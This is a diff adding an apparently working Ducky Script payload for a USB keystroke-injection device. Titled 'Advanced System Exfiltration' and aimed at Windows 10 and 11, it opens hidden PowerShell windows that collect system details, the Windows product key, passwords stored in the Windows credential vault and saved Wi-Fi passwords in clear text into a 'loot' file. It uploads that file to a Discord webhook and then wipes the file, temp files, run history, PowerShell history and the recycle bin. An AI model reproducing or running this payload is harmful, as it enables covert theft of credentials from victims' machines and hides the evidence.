@@ -1,0 +1,437 @@
+REM Title: A.S.E - Advanced_System_Exfiltration
+REM Author: LulzAnarchyAnon
+REM Description: This slow, and steady staged payload takes it's time and gleans detailed system information using 
+REM powershell, Ducky script and notepad. First hidden powershells are opened in stages, and payloads are deployed to 
+REM collect the target computers system information, Then a notepad.txt file named loot is created with all 
+REM the gleaned information, and hidden in the Public Users folder C:\Users\Public\loot.txt The loot is then 
+REM exfiltrated using a Discord webhook. In the final stage of the payload the loot.txt file, the recycling bin 
+REM contents, the temp folder contents and powershell history are all deleted. 
+REM Target: Windows 10 & 11
+REM Props: iamjakoby, HAK5 and a huge shout out to O.MG!!!
+REM Version: 1.0
+REM Category: Exfiltration
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden  
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName Win32_ComputerSystem
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden  
+DELAY 200
+ENTER
+DELAY 500
+STRING systeminfo  |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden   
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey  |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden   
+DELAY 200
+ENTER
+DELAY 500
+STRING $networkAdapters | Select-Object Name, MACAddress, Speed |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden   
+DELAY 200
+ENTER
+DELAY 500
+STRING $networkAdapters = Get-CimInstance -ClassName CIM_NetworkAdapter |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden 
+DELAY 200
+ENTER
+DELAY 500
+STRING $diskDrives = Get-CimInstance -ClassName CIM_DiskDrive |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden  
+DELAY 200
+ENTER
+DELAY 500
+STRING $os = Get-CimInstance -ClassName CIM_OperatingSystem |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden  
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-NetIPAddress |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden 
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-DnsClient |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden   
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName SoftwareLicensingService | Select-Object -ExpandProperty OA3xOriginalProductKey  |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden    
+DELAY 200
+ENTER
+DELAY 500
+STRING 
+STRING [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+ENTER
+STRING $vault = New-Object Windows.Security.Credentials.PasswordVault
+ENTER
+STRING $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } |
+DELAY 500
+ENTER
+DELAY 500
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden 
+DELAY 200
+ENTER
+DELAY 500
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden 
+ENTER
+DELAY 500
+STRING  Get-ComputerInfo |
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 2000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden 
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden  
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName Win32_BIOS
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden 
+DELAY 200
+ENTER
+DELAY 500
+STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"
+DELAY 5000
+ENTER
+DELAY 5000
+STRING Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden  
+DELAY 200
+ENTER
+DELAY 200
+STRING function Upload-Discord {
+DELAY 500
+ENTER
+DELAY 200
+STRING [CmdletBinding()]
+DELAY 500
+ENTER
+DELAY 200
+STRING param (
+DELAY 500
+ENTER
+DELAY 200
+STRING [parameter(Position=0,Mandatory=$False)]
+DELAY 500
+ENTER
+DELAY 200
+STRING [string]$file,
+DELAY 500
+ENTER
+DELAY 200
+STRING [parameter(Position=1,Mandatory=$False)]
+DELAY 500
+ENTER
+DELAY 200
+STRING [string]$text 
+DELAY 500
+ENTER
+DELAY 200
+STRING )
+DELAY 500
+ENTER
+DELAY 200
+STRING $hookurl = 'YOUR DISCORD WEBHOOK HERE'
+DELAY 500
+ENTER
+DELAY 200
+STRING $Body = @{
+DELAY 500
+ENTER
+DELAY 200
+STRING 'username' = $env:"YOUR DISCORD USERNAME HERE"
+DELAY 500
+ENTER
+DELAY 200
+STRING 'content' = $text
+DELAY 500
+ENTER
+DELAY 200
+STRING }
+DELAY 500
+ENTER
+DELAY 200
+STRING if (-not ([string]::IsNullOrEmpty($text))){
+DELAY 500
+ENTER
+DELAY 200
+STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body |  ConvertTo-Json)};
+DELAY 500
+ENTER
+DELAY 200
+STRING curl.exe -F "file1=@$file" $hookurl
+DELAY 200
+ENTER
+DELAY 200
+STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+DELAY 500
+ENTER
+DELAY 200
+STRING }
+DELAY 200
+ENTER
+DELAY 200
+STRING Upload-Discord -file "C:\Users\Public\loot.txt"
+DELAY 200
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden    
+DELAY 200
+ENTER
+DELAY 500
+STRING Remove-Item "C:\Users\Public\loot.txt"
+DELAY 500
+ENTER
+DELAY 500
+STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+DELAY 500
+ENTER
+DELAY 500
+STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+DELAY 500
+ENTER
+DELAY 500
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+DELAY 500
+ENTER
+DELAY 500
+STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 200
+ENTER
